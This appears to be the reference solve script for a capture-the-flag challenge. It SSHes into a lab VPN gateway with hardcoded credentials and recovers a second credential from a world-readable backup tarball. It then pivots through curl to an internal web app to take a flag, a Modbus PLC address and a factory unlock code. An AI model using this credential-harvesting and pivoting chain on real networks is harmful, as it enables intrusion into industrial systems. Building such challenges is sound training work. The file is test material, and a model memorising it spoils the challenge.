#!/usr/bin/env python3
"""
Lateral Drift - reference exploit / acceptance test.

1. SSH into vpn-gateway with the credential recovered in Know Your Mark.
2. Extract the world-readable backup tarball and recover the engineering-workstation
   credential from it.
3. Pivot from inside the vpn-gateway shell (engineering-workstation listens on
   127.0.0.1 in the gateway's network namespace, so nothing outside reaches it) and
   log into the engineering-workstation web app with that credential.
4. Recover the flag from the engineering notes panel, and this challenge's hand-off
   to Last Mile (3/3): process-plc's live Modbus/TCP host:port.

Usage (local compose publishes 2223; the Fargate copy is <host> port 22):
    python solve.py --host 127.0.0.1 --port 2223 \
        --vpn-user rootkit --vpn-pass icarus_override
"""

import argparse
import re
import sys

import paramiko


def main() -> None:
    p = argparse.ArgumentParser(description="Lateral Drift - reference exploit")
    p.add_argument("--host", default="127.0.0.1", help="vpn-gateway host")
    p.add_argument("--port", type=int, default=2223, help="vpn-gateway SSH port")
    p.add_argument("--vpn-user", default="rootkit",
                    help="VPN credential username recovered in Know Your Mark")
    p.add_argument("--vpn-pass", default="icarus_override",
                    help="VPN credential password recovered in Know Your Mark")
    p.add_argument("--workstation-host", default="127.0.0.1",
                    help="engineering-workstation's address as reachable from vpn-gateway")
    args = p.parse_args()

    print(f"[*] SSH to {args.host}:{args.port} as {args.vpn_user} ...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(args.host, port=args.port, username=args.vpn_user,
                        password=args.vpn_pass, timeout=10)
    except Exception as exc:
        print(f"[-] SSH login failed: {exc}")
        sys.exit(1)
    print("[+] Logged in.\n")

    def run(cmd: str) -> str:
        _, stdout, stderr = client.exec_command(cmd)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
        if err.strip():
            print(f"    [stderr] {err.strip()}")
        return out

    print("[*] Checking /opt/backups/ ...")
    print(run("ls -la /opt/backups/"))

    print("[*] Extracting eng-sync.tar.gz ...")
    conf = run("tar -xzOzf /opt/backups/eng-sync.tar.gz eng-sync.conf 2>/dev/null || "
               "(cd /tmp && tar -xzf /opt/backups/eng-sync.tar.gz && cat eng-sync.conf)")
    print(conf)

    user_m = re.search(r"workstation_user=(\S+)", conf)
    pass_m = re.search(r"workstation_pass=(\S+)", conf)
    if not (user_m and pass_m):
        print("[-] Could not find workstation credentials in the backup.")
        sys.exit(1)
    eng_user, eng_pass = user_m.group(1), pass_m.group(1)
    print(f"[+] Recovered second credential: {eng_user} / {eng_pass}\n")

    print(f"[*] Pivoting to http://{args.workstation_host}:5000/ from inside vpn-gateway ...")
    body = run(
        f'curl -s -c /tmp/_cj.txt -d "username={eng_user}" -d "password={eng_pass}" '
        f'http://{args.workstation_host}:5000/login -L'
    )
    # The Documents panel links Last Mile's handout; fetch it with the same session cookie.
    sheet = run(f"curl -s -b /tmp/_cj.txt http://{args.workstation_host}:5000/docs/rc200-commissioning")
    run("rm -f /tmp/_cj.txt")
    client.close()

    if "flag{" not in body:
        print("[-] Login did not return the flag. Full response:\n" + body)
        sys.exit(1)

    start = body.index("flag{")
    end = body.index("}", start) + 1
    print(f"[+] {body[start:end]}\n")

    print("[*] Hand-off to Last Mile (3/3):")
    for line in body.splitlines():
        if "Modbus/TCP" in line or "Status page" in line:
            print("   ", re.sub(r"<[^>]+>", "", line).strip())

    print("\n[*] Documents panel -> commissioning sheet (Last Mile's handout):")
    code = re.search(r"Factory default unlock code: (\d+)", sheet)
    print("   ", f"factory default unlock code = {code.group(1)}" if code else "[-] commissioning sheet not found")


if __name__ == "__main__":
    main()
